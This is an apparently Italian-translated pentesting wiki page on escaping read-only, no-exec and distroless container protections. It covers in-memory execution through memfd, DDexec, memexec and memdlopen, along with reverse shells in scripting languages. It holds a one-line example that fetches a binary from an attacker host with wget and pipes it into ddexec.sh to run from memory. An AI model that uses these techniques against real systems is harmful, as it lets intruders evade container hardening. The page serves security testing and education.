# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video

Nei video seguenti puoi trovare le tecniche menzionate in questa pagina spiegate in modo più approfondito:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** rimarrà comunque scrivibile, quindi non è vero che non possiamo scrivere nulla sul disco. Tuttavia, questa cartella sarà **mounted with no-exec protection**, quindi se scarichi un binary qui **non potrai eseguirlo**.

> [!WARNING]
> Dal punto di vista della red team, questo rende **complicato scaricare ed eseguire** binary che non sono già presenti nel sistema (come backdoors o enumeratori come `kubectl`).

## Bypass più semplice: Scripts

Nota che ho parlato di binary: puoi **eseguire qualsiasi script** purché l'interprete sia presente nella macchina, come uno **shell script** se `sh` è presente o uno **python script** se `python` è installato.

Tuttavia, questo non è sufficiente per eseguire il tuo binary backdoor o altri strumenti binary di cui potresti aver bisogno.

## Memory Bypasses

Se vuoi eseguire un binary ma il file system non lo permette, il modo migliore è **eseguirlo dalla memoria**, dato che le **protezioni non si applicano lì**.

### FD + exec syscall bypass

If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.

Per questo puoi usare facilmente il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli un binary e genererà uno script nella lingua indicata con il **binary compresso e b64 encoded** con le istruzioni per **decodificarlo e decomprimerlo** in un **fd** creato chiamando la syscall `create_memfd` e una chiamata alla syscall **exec** per eseguirlo.

> [!WARNING]
> Questo non funziona in altri linguaggi di scripting come PHP o Node perché non hanno un **metodo predefinito per invocare raw syscalls** da uno script, quindi non è possibile chiamare `create_memfd` per creare l'**fd di memoria** dove memorizzare il binary.
>
> Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, perché non ti sarà permesso eseguirlo a causa della protezione **no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) è una tecnica che permette di modificare la memoria del proprio processo sovrascrivendo il suo **`/proc/self/mem`**.

Quindi, controllando il codice assembly eseguito dal processo, puoi scrivere uno **shellcode** e "mutare" il processo per eseguire qualsiasi codice arbitrario.

> [!TIP]
> **DDexec / EverythingExec** permette di caricare ed **eseguire** il tuo **shellcode** o **qualsiasi binary** dalla **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per maggiori informazioni su questa tecnica consulta il Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è il naturale passo successivo di DDexec. È un **DDexec shellcode demonised**, quindi ogni volta che vuoi **run a different binary** non è necessario rilanciare DDexec: puoi semplicemente eseguire il memexec shellcode tramite la tecnica DDexec e poi **communicate with this deamon to pass new binaries to load and run**.

Puoi trovare un esempio su come usare **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con uno scopo simile a DDexec, la tecnica [**memdlopen**](https://github.com/arget13/memdlopen) permette un **easier way to load binaries** in memory per eseguirli in seguito. Potrebbe anche permettere di caricare binari con dipendenze.

## Distroless Bypass

Per una spiegazione dedicata di **what distroless actually is**, quando è utile, quando non lo è, e come cambia il post-exploitation tradecraft nei container, consulta:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Che cos'è distroless

Distroless containers contengono solo i **componenti minimi necessari per eseguire una specifica application or service**, come librerie e runtime dependencies, ma escludono componenti più grandi come un package manager, shell o utility di sistema.

Lo scopo dei distroless containers è di **ridurre l'attack surface dei container eliminando componenti non necessari** e minimizzare il numero di vulnerabilità che possono essere sfruttate.

### Reverse Shell

In un container distroless potresti **non trovare nemmeno `sh` o `bash`** per ottenere una shell normale. Non troverai nemmeno binari come `ls`, `whoami`, `id`... tutto quello che normalmente esegui su un sistema.

> [!WARNING]
> Di conseguenza, non **potrai** ottenere una **reverse shell** o **enumerate** il sistema come fai di solito.

Tuttavia, se il container compromesso esegue ad esempio un'app Flask, allora python è installato, e quindi puoi ottenere una **Python reverse shell**. Se gira node, puoi ottenere una Node rev shell, e lo stesso vale per la maggior parte dei **scripting language**.

> [!TIP]
> Usando lo scripting language potresti **enumerate the system** sfruttando le capacità del linguaggio.

Se non ci sono protezioni **`read-only/no-exec`** potresti abusare della tua reverse shell per **scrivere nel file system i tuoi binaries** e **eseguirli**.

> [!TIP]
> Tuttavia, in questo tipo di container queste protezioni di solito sono presenti, ma potresti usare le **precedenti memory execution techniques** per bypassarle.

Puoi trovare **esempi** su come **exploit some RCE vulnerabilities** per ottenere scripting languages **reverse shells** e eseguire binaries dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
